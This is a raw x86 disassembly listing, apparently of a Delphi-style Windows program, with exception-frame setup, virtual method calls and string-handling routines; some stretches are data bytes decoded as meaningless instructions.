push sub_4787b9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4787bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx edi
mov esi [ ebx + 0x98 ]
mov edx [ esi + 0x20 ]
mov eax esi
call sub_475a24
pop edi
pop esi
pop ebx
retn
sub_4787dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_404e44
push 0x0
push 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor edx edx
push ebp
push sub_4788a4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788ab
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
retn
xor edx edx
push ebp
push sub_478882
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_478871
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov ecx 0xfa
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_478cd4
test al al
jne r-xdata
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4787bc
sub_4788b4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478a63
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov ebx edi
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_463298
mov [ ebp - 0xc ] edi
jmp r-xdata
push 0x0
push 0x0
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor edx edx
push ebp
push sub_478a39
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa0 ]
test eax eax
jle r-xdata
call sub_404884
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp eax [ esi ]
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478a6a
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
add [ esi ] 0x1
jno r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405270
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
test ebx ebx
je r-xdata
call sub_403e34
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_477d64
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
call sub_405270
jne r-xdata
lea eax [ ebp - 0x1c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405170
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_464b0c
jmp r-xdata
sub_478a83
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] cl
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_478cb6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax esi
call sub_404e44
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xa8 ]
mov [ ebp + 0xc ] eax
cmp bl 0xa
jne r-xdata
movzx eax bl
add eax 0xfffffff8
cmp eax 0x13
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_477c08
mov ebx eax
mov eax [ esi ]
call sub_405120
mov edi eax
cmp edi [ ebp + 0xc ]
jg r-xdata
mov eax [ esi ]
call sub_405120
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_40502c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
movzx eax [ eax + lookup_table_478b0c ]
jmp [ eax * 4 + jump_table_478b20 ]
test edi edi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_405120
test eax eax
jne r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x10 ] 0x0
jle r-xdata
mov eax esi
mov edx edi
call sub_4055ac
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ esi ]
dec edi
test eax eax
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_477a00
jmp r-xdata
mov edx edi
sub edx 0x1
jno r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40502c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax edi
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
sub eax edx
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478cbd
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
call sub_403e2c
cmp edi [ eax - 0x4 ]
jb r-xdata
mov eax esi
call sub_4055ac
cmp [ ebp - 0xd ] 0x0
je r-xdata
call sub_403e34
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_477a00
jmp r-xdata
mov edi eax
lea ecx [ ebp - 0x4 ]
mov edx edi
mov al 0x20
call sub_405610
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
call sub_403e34
inc edi
cmp [ eax + edi - 0x1 ] 0xd
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
jmp r-xdata
sub edi 0x1
jno r-xdata
mov eax 0x1
mov edx [ esi ]
dec eax
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0xa
je r-xdata
sub_478b12
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ r-xdata ] al
cmp [ ebx - 0x748dffb9 ] cl
inc edi
add [ esi ] bl
mov [ edi ] es
push ds
mov [ edi ] es
push ds
mov [ edi ] es
cmp bl 0xa
jne r-xdata
mov edx edi
sub edx 0x1
jno r-xdata
mov eax [ ebp - 0x8 ]
call sub_477c08
mov ebx eax
mov eax [ esi ]
call sub_405120
mov edi eax
cmp edi [ ebp + 0xc ]
jg r-xdata
mov eax [ esi ]
call sub_405120
mov edi eax
jmp r-xdata
mov eax esi
call sub_4055ac
cmp [ ebp - 0xd ] 0x0
je r-xdata
call sub_403e34
movzx eax bl
add eax 0xfffffff8
cmp eax 0x13
ja r-xdata
test edi edi
jle r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_40502c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
movzx eax [ eax + lookup_table_478b0c ]
jmp [ eax * 4 + jump_table_478b20 ]
mov eax esi
mov edx edi
call sub_4055ac
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ esi ]
dec edi
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
call sub_405120
test eax eax
jne r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x10 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478cbd
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
call sub_403e2c
cmp edi [ eax - 0x4 ]
jb r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_477a00
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_40502c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax edi
cdq
idiv [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
sub eax edx
jno r-xdata
inc edi
cmp [ eax + edi - 0x1 ] 0xd
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_477a00
jmp r-xdata
mov edi eax
lea ecx [ ebp - 0x4 ]
mov edx edi
mov al 0x20
call sub_405610
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40512c
cmp [ ebp - 0xd ] 0x0
je r-xdata
call sub_403e34
sub edi 0x1
jno r-xdata
mov eax 0x1
mov edx [ esi ]
dec eax
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0xa
je r-xdata
sub_478cec
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_406474
xor eax eax
push ebp
push sub_478d78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_406248
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d7f
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ esi + 0xc8 ]
test eax eax
jne r-xdata
or ecx 0xffffffff
mov edx [ ebp - 0x4 ]
call sub_475d58
mov edx [ esi + 0xc8 ]
mov edx [ edx + 0x20 ]
mov eax [ esi + 0xcc ]
cmp edx eax
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
test eax eax
jle r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xbc ]
sub_478d84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_478e6b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] 0xb
lea ecx [ ebp - 0x1c ]
mov eax [ r-xdata ]
pop edx
call sub_4624e8
mov eax [ ebp - 0x10 ]
push eax
mov edx ebx
mov eax [ r-xdata ]
call sub_4624e0
mov edx eax
mov eax [ r-xdata ]
pop ecx
call sub_46325c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4638f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_478e49
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x90 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478e50
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_478ee8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x64 ]
mov eax [ ebx + 0x9c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_478f10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478f46
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f4d
retn
mov edx rw-data
mov eax [ r-xdata ]
call sub_462560
sub_478f50
pushfd
pop [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc00478f ]
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
pop ds
inc ebp
dec ecx
push esp
jb r-xdata
push esp
aas
inc eax
outsb
jae r-xdata
sbb [ edi ] bh
outsb
jae r-xdata
popad
jb r-xdata
popad
jb r-xdata
inc ecx
add ah al
fiadd [ ecx ]
adc [ ebx - 0x212bffb9 ] dl
inc ecx
add ah cl
fild [ ecx ]
add dl ah
add ah ch
fld [ ecx ]
enter 0x416d 0x0
inc edi
outsb
je r-xdata
push esp
jb r-xdata
dec ecx
outsb
je r-xdata
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x50000000 ] cl
adc [ eax ] al
mov [ eax ] es
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x19000000 ] bl
push esp
dec ecx
inc ebx
jne r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + ecx * 2 + 0x47 ] ah
add [ edi + eax * 2 ] cl
inc edi
add [ edi + eax * 2 + 0x48140047 ] bl
inc edi
add [ eax + 0xc004032 ] dl
xchg ebx eax
inc edi
add [ eax + 0x5c004032 ] dl
xchg esp eax
inc edi
add [ eax ] cl
xchg esp eax
inc edi
add [ esp + edx * 4 - 0x6aefffb9 ] dh
inc edi
add [ edx + edx * 4 - 0x6da3ffb9 ] dh
inc eax
add [ esi + eax * 2 ] cl
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
jb r-xdata
add ah bl
xor [ esi ] eax
and al [ ebp + 0x49 ]
cld
inc eax
jb r-xdata
mov [ eax ] al
add [ eax ] al
je r-xdata
xchg ebx eax
inc edi
add ah dl
fiadd [ ecx ]
int3
js r-xdata
outsd
js r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x88 ]
lea eax [ edi + 0x88 ]
insd
push esp
jb r-xdata
loop r-xdata
push ebp
inc esp
push eax
dec esi
outsd
je r-xdata
jo r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
inc ebx
imul esi [ edx + 0x63 ] 0x72616c75
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + 0xc0047 ] dl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
js r-xdata
outsb
jae r-xdata
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x77ffbff0 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
add [ eax ] al
add [ ecx ] bl
pop esp
xchg edx eax
add ah ah
fiadd [ ecx ]
inc edi
add [ ecx + edx * 4 + 0x47 ] ah
jne r-xdata
inc ecx
jb r-xdata
sbb [ ecx + ecx * 2 + 0x64 ] edx
inc ebx
jne r-xdata
clc
inc [ eax + eax * 8 - 0x174af8c ]
call sub_404e98
lea eax [ edi + 0x8c ]
mov [ eax ] al
add [ eax ] al
popad
jb r-xdata
fiadd [ ecx ]
or dl ah
inc ecx
nop
adc [ eax + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add ah ah
nop
inc edi
add [ ecx + edx * 4 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
xchg ecx eax
inc edi
add [ eax + 0x20000000 ] ah
inc ebp
inc edi
add al ch
loope r-xdata
dec [ ebx + 0x9083 ]
je r-xdata
outsb
je r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
add [ ecx + 0x9087 ] cl
add [ edi ] cl
mov dh 0x83
xchg esp eax
add [ eax ] al
add [ eax + 0x9487 ] cl
mov esp 0x838bfff8
nop
add [ eax ] al
insd
push esp
jb r-xdata
jb r-xdata
mov edx [ ebx + 0x8c ]
add [ eax ] al
outsb
jae r-xdata
clc
dec [ ebp + 0x8c87 ]
add [ ebx + 0x8c93 ] cl
add al ch
clc
js r-xdata
popad
jb r-xdata
call sub_404e98
mov eax [ ebx + 0x90 ]
mov [ edi + 0x90 ] eax
add [ eax ] al
and al 0x91
inc edi
add [ edi ] al
outsb
je r-xdata
or [ ebp - 0x78720008 ] edi
mov [ eax ] es
jb r-xdata
movzx eax [ ebx + 0x94 ]
mov [ edi + 0x94 ] al
lea eax [ edi + 0x98 ]
mov edx [ ebx + 0x98 ]
call sub_404e98
jmp r-xdata
js r-xdata
add [ ebp + 0x9887 ] cl
add [ ebx + 0x9893 ] cl
adc [ eax + 0x45bc0047 ] 0x47
add [ ebx ] al
add [ eax ] bl
dec ecx
inc ebx
jne r-xdata
add al ch
into
mov esp 0x9ebfff8
mov edx esi
mov eax ebx
call sub_416eac
add [ eax ] al
je r-xdata
xchg ebx eax
cwde
insd
push esp
jb r-xdata
add [ eax ] al
outsb
jae r-xdata
clc
popad
jb r-xdata
outsb
je r-xdata
adc [ eax + eax - 0x78780000 ] 0xffffff94
jb r-xdata
retn
js r-xdata
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x9c ]
test esi esi
je r-xdata
add [ eax ] al
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x48 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x90 ]
push edx
push 0x0
mov ecx [ eax + 0x88 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x9c ]
call sub_4791dc
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_479164
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
mov edi esi
lea eax [ edi + 0x88 ]
mov edx [ ebx + 0x88 ]
call sub_404e98
lea eax [ edi + 0x8c ]
mov edx [ ebx + 0x8c ]
call sub_404e98
mov eax [ ebx + 0x90 ]
mov [ edi + 0x90 ] eax
movzx eax [ ebx + 0x94 ]
mov [ edi + 0x94 ] al
lea eax [ edi + 0x98 ]
mov edx [ ebx + 0x98 ]
call sub_404e98
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4791dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x9c ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x48 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x90 ]
push edx
push 0x0
mov ecx [ eax + 0x88 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x9c ]
call sub_4791dc
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_47925c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4792a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4792ae
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4792b4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4792ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479306
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_479330
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x110 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4793fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
test ebx ebx
je r-xdata
mov [ esi + 0x9c ] edi
test edi edi
je r-xdata
cmp esi ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479401
lea eax [ ebp - 0x110 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov edx esi
mov eax edi
call sub_41db30
mov ebx [ ebx + 0x9c ]
test ebx ebx
jne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x10c ]
mov eax [ esi ]
call sub_403e44
lea eax [ ebp - 0x10c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x110 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x110 ]
mov eax [ r-xdata ]
pop ecx
call sub_4624e8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ sub_478f50 ]
call sub_4631dc
call sub_4047d8
sub_479408
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_479452
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479459
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_47945c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4794a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4794ae
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4794b4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4794ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479506
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_479510
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47955b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479562
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_479568
mov ah 0x95
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg esi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
inc edi
add [ eax + eax ] bl
add [ eax ] al
insb
push ecx
inc edi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al al
push ebx
inc edi
add [ esi + edx * 4 + 0x6eb40047 ] bl
inc ecx
add al cl
insd
inc ecx
add [ esp + edx * 2 ] ah
inc edi
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
pop es
or edx [ ecx + ecx * 2 + 0x64 ]
push edx
add [ ebx + edx * 2 + 0x56bc0047 ] al
inc edi
add al ah
xchg esi eax
inc edi
add [ eax - 0x69 ] bl
inc edi
add al cl
cdq
inc edi
add [ ebx + edx * 2 ] ah
inc edi
add [ ebx + edx * 2 ] bh
inc edi
add ah al
cwde
inc edi
add [ ecx + ebx * 4 + 0x47 ] al
add [ ecx + ebx * 4 + 0x55180047 ] ah
inc edi
add [ eax + 0xb004756 ] dl
push esp
dec ecx
push edx
jo r-xdata
0x45100047 0x6449
push edx
jns r-xdata
jo r-xdata
cld
inc eax
jns r-xdata
mov al 0x32
inc esi
add al ch
arpl [ edi - 0x27740002 ] cx
jns r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
les ebx [ edx + 0x45100047 ]
dec ecx
push edx
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
inc esi
inc ebx
mov ah 0x95
inc edi
add [ eax ] ah
push edx
inc edi
add [ edx ] al
add [ edx ] cl
dec ecx
push edx
adc [ edx + 0x47 ] 0x0
lodsb [ esi ]
jo r-xdata
inc esi
inc ebx
adc [ esi + 0xb070047 ] dl
push esp
dec ecx
push edx
lea ecx [ ebp - 0x4 ]
mov edx esi
